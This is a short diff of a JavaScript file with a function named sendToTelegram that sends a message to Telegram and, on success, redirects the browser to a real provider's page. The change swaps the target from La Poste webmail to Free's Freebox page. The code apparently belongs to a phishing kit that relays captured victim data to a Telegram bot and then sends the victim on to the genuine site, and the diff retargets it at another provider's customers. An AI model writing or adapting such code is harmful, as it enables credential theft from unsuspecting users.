@@ -27,9 +27,9 @@ function sendToTelegram(){
             text: message
         })
     })
-.then(response => {
+  .then(response => {
     if (response.ok) {
-        window.location.href = "https://www.laposte.fr/webmail";
+        window.location.href = "https://www.free.fr/freebox";
     } else {
         console.error("Erreur lors de l'envoi.");
     }
